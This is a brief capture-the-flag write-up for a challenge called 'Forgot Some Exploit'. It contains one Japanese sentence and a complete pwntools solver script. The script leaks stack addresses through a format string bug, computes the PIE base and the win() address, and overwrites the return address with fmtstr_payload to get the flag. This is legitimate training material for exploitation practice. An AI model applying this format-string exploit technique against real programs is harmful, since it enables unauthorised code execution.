# writeup - Forgot Some Exploit

fsbでleak。2回目でリターンアドレスの書き換え

## solver

```python
#!/usr/bin/env python3
from pwn import *
import os

HOST = os.getenv('CTF4B_HOST', '0.0.0.0')
PORT = int(os.getenv('CTF4B_PORT', '9002'))

context.log_level = 'critical'
binfile = './chall'
e = ELF(binfile)
context.binary = binfile

#def exec_fmt(payload):
#    p = process(binfile)
#    p.sendline(payload)
#    p.sendline(payload)
#    return p.recvall()
#
#autofmt = FmtStr(exec_fmt)
offset = 6 #autofmt.offset

io = remote(HOST, PORT)

main_leak_payload = f'%41$p %47$p'

io.sendline(main_leak_payload.encode())
line = io.readline().decode().strip().split()
leak = list(map(lambda p: int(p, base=16), line))
main_addr = leak[0] - 14
base_addr = main_addr - e.sym['main']
win_addr = base_addr + e.sym['win']
ret_addr = leak[1] - 0x240

payload = fmtstr_payload(offset, {ret_addr: win_addr})
assert(len(payload) < 0x100)

io.sendline(payload)

io.recvuntil(b'ctf4b')
print('ctf4b' + io.readline().decode(), end='')
```
